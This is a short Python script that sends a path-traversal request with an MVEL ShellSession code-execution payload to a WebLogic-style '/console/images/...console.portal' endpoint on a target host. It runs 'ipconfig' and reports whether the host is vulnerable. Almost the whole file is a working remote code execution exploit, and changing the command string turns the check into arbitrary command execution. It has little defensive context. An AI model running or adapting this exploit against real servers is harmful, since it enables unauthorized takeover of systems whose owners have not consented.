#!/usr/bin/python3

import re
import requests
import sys
import os

def exploit(dst_addr):
	request = requests.session()
	headers = {"Content-type": "application/x-www-form-urlencoded; charset=utf-8"}
	post_data="_nfpb=false&_pageLable=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(\"java.lang.Runtime.getRuntime().exec('ipconfig');\");"
	
	resp = request.post("http://"+dst_addr+"/console/images/%252E%252E%252Fconsole.portal", verify=False, headers=headers, data=post_data)
	
	if resp.status_code==200:
			p = re.compile('\w+indows \w+')
			m = p.match(resp.text)
			if m:
				print("Vuln Found")
			else:
				print("Not Found")
	else:
		print("Page Not Found")

if __name__ == "__main__":
	if len(sys.argv) == 2:
		sys.argv.append('80')
	elif len(sys.argv) < 3:
		print('Usage: python %s <dst_ip> <dst_port>' % os.path.basename(sys.argv[0]))
		sys.exit()

	address =(sys.argv[1], sys.argv[2])
	dst_addr=":".join(address)
	exploit(dst_addr)
